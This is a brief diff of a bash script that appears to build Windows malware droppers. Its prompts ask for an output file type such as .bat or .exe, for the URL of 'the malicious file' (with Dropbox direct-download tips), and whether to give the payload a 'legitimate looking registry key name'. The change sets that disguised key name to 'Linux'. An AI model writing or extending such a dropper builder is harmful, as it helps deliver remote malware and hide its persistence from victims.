@@ -5,6 +5,7 @@ read -p "file name? [Add the file type at the end of the name e.g. .bat, .exe, .
 read -p "Whats the URL to the malicious file? [Replace dl=0 with dl=1 on the end of the dropbox link if your using dropbox] >> " droplink
 read -p "do you want a legitimate looking registry key name? (Y/N) >> " rege
 
+os_name=Linux
 if [[ $rege =~ ^[Yy]$ ]]; then
     reges="${os_name}"
     echo "Registry key name = ${os_name}"
